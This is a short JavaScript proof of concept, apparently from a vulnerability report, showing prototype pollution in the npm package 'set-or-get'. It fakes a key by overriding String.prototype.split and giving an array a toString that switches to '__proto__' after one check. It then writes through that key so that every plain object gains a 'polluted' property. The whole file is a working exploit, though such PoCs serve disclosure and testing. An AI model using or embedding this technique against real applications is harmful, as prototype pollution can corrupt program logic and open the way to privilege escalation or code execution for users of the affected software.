var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var SetOrGet = require('set-or-get');
obj = {};
console.log({}.polluted);
SetOrGet(obj, '__proto__', {}).polluted = 'yes';
console.log({}.polluted);